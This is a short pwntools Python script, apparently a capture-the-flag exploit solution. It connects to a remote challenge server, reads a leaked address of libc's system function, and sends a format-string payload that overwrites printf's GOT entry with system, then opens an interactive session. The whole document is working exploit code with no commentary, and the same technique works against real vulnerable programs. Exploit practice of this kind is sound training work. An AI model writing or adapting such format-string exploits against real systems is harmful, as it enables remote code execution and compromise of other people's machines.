from pwn import *

elf = context.binary = ELF('./chall')
p = remote('152.118.201.241', 3012)

p.recvuntil(b"Gift for you: ")
system = int(p.recvline().strip(), 16)

log.info(f"system leak: {hex(system)}")

printf_got = elf.got['printf']
offset = 6

payload = fmtstr_payload(offset, {printf_got: system}, write_size='short')
log.info(f"payload size: {len(payload)}")

p.sendline(payload)
p.interactive()